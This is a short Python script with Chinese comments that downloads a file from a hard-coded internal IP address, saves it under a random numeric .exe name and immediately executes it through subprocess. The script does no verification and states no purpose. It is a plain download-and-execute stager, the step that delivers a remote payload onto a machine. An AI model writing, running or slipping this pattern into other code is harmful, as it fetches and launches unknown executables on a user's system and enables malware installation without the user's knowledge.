import os
import requests
import random
import subprocess

def download_file(url, save_path, filename=None):
    # 如果没有指定文件名，则使用URL的最后一个部分作为文件名
    if not filename:
        filename = url.split('/')[-1]

    # 构建完整的文件路径
    filepath = os.path.join(save_path, filename)

    # 发送GET请求并流式读取响应
    with requests.get(url, stream=True) as r:
        r.raise_for_status()
        # 以二进制模式打开文件，并写入数据
        with open(filepath, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192):
                if chunk:  # 过滤掉空的数据块
                    f.write(chunk)
    return filepath


# 使用函数
url = 'http://172.20.0.27/abc'
save_path = '.\\'
random_integer = random.randint(10000, 99999)
filename = str(random_integer) + '.exe'
downloaded_file = download_file(url, save_path, filename)
result = subprocess.run([filename])












